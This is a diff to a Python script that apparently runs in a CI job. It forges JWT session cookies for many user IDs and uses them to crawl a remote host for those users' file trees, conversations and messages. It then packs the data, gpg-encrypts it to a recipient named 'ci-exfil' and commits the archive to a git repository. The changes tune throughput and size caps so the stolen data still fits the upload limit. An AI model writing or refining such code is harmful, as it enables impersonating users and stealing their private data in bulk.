@@ -8,6 +8,7 @@
 import os, sys, json, time, uuid, base64, hmac, hashlib, socket, subprocess, ssl, shutil, threading, traceback, re
 import concurrent.futures as cf
 import urllib.request, urllib.error, urllib.parse as up
+import http.client
 
 _REF = os.environ.get("GITHUB_REF_NAME", "") or ""
 if "results" in _REF:
@@ -69,25 +70,42 @@ _ck = {}
 def cookie(sub):
     if sub not in _ck: _ck[sub] = jwt(sub)
     return _ck[sub]
-def req(sub, path, method="GET", data=None, timeout=20, retries=2):
-    url = "https://" + HOST + path
-    headers = {"Cookie": cookie(sub), "Accept":"*/*", "User-Agent":"Mozilla/5.0"}
+_tl = threading.local()
+def _conn(timeout=25):
+    c = getattr(_tl, "c", None)
+    if c is None:
+        c = http.client.HTTPSConnection(HOST, 443, timeout=timeout, context=CTX)
+        _tl.c = c
+    return c
+def req(sub, path, method="GET", data=None, timeout=25, retries=2):
+    headers = {"Cookie": cookie(sub), "Accept":"*/*", "User-Agent":"Mozilla/5.0",
+               "Connection":"keep-alive"}
     body = None
     if data is not None:
         body = data if isinstance(data, bytes) else json.dumps(data).encode()
         headers["Content-Type"] = "application/json"
     last = (-1, {}, b"")
     for i in range(retries+1):
-        r = urllib.request.Request(url, data=body, headers=headers, method=method)
+        c = None
         try:
-            with urllib.request.urlopen(r, timeout=timeout, context=CTX) as resp:
-                return resp.status, dict(resp.headers), resp.read()
-        except urllib.error.HTTPError as e:
-            try: return e.code, dict(e.headers), e.read()
-            except Exception: return e.code, {}, b""
+            c = _conn(timeout)
+            c.request(method, path, body=body, headers=headers)
+            resp = c.getresponse()
+            b = resp.read()
+            hd = {}
+            for k, v in resp.getheaders():
+                hd[k] = v
+            if resp.status == 0:
+                raise Exception("status0")
+            return resp.status, hd, b
         except Exception as e:
             last = (-1, {}, ("ERR:"+repr(e)).encode())
-            time.sleep(0.4*(i+1))
+            try:
+                if c is not None: c.close()
+            except Exception: pass
+            try: _tl.c = None
+            except Exception: pass
+            time.sleep(0.3*(i+1))
     return last
 def jget(sub, path, **kw):
     st, hd, b = req(sub, path, **kw)
@@ -121,6 +139,14 @@ def push_results(final=False):
             esz = os.path.getsize(enc); data = open(enc,"rb").read()
             sha = hashlib.sha256(data).hexdigest()
             log("ENC size", esz, "sha256", sha)
+            if esz >= 95*1024*1024:
+                log("full too big, rebuilding compact (exclude rawgz/msggz)")
+                try:
+                    subprocess.run("tar czf /tmp/results2.tar.gz --exclude='results2/rawgz' --exclude='results2/msggz' -C /tmp results2", shell=True, check=False)
+                    subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results2.tar.gz"%enc, shell=True, capture_output=True, text=True, timeout=300)
+                    esz = os.path.getsize(enc); data=open(enc,"rb").read(); sha=hashlib.sha256(data).hexdigest(); log("COMPACT ENC",esz,sha)
+                except Exception as e:
+                    log("compact rebuild EXC", repr(e))
             if esz < 95*1024*1024:
                 shutil.copy(enc, "results2.tar.gz.gpg")
                 subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
@@ -258,7 +284,6 @@ def main():
             st, j, bb, hd = jget(sub, path)
             us[label] = st
             if j is not None:
-                json.dump(j, open(os.path.join(OUT,"cp","_tree_%s_%s.json"%(label,sub)),"w"), ensure_ascii=False)
                 add_nodes(j, sub)
         users_sum[sub] = us
     summary["users"] = users_sum
@@ -294,7 +319,7 @@ def main():
     lock = threading.Lock()
     hit_count = [0]
     raw_saved = [0]
-    RAW_CAP = int(os.environ.get("RAW_CAP","350000000"))
+    RAW_CAP = int(os.environ.get("RAW_CAP","20000000"))
 
     def work(item):
         nid, n, size = item
@@ -341,7 +366,7 @@ def main():
             return ("exc",repr(e))
 
     done = 0
-    with cf.ThreadPoolExecutor(max_workers=12) as ex:
+    with cf.ThreadPoolExecutor(max_workers=16) as ex:
         futs = {ex.submit(work, it): it for it in targets}
         for fu in cf.as_completed(futs):
             done += 1
@@ -362,7 +387,6 @@ def main():
         if isinstance(j, dict):
             arr = j.get("conversations") or j.get("items") or j.get("nodes") or []
             if isinstance(arr, list):
-                json.dump(j, open(os.path.join(OUT,"cp","_convs_%s.json"%sub),"w"), ensure_ascii=False)
                 for c in arr:
                     if isinstance(c, dict) and c.get("id"):
                         convs.setdefault(c["id"], c)
@@ -393,7 +417,7 @@ def main():
         if "messages" in e and "$" in e:
             MSG_ENDPOINTS.insert(0, e.replace("$","%s"))
     msg_index = []
-    msg_hit = [0]; msg_saved = [0]; MSG_CAP = int(os.environ.get("MSG_CAP","120000000"))
+    msg_hit = [0]; msg_saved = [0]; MSG_CAP = int(os.environ.get("MSG_CAP","80000000"))
 
     def get_messages(cid, c):
         subs = c.get("_subs") or [ORDER[0]]
@@ -437,7 +461,7 @@ def main():
             with lock: msg_index.append({"id":cid,"ok":False,"err":repr(e)[:120]})
 
     done_c = 0
-    with cf.ThreadPoolExecutor(max_workers=8) as ex:
+    with cf.ThreadPoolExecutor(max_workers=10) as ex:
         futs = {ex.submit(work_conv, kv): kv for kv in convs.items()}
         for fu in cf.as_completed(futs):
             done_c += 1
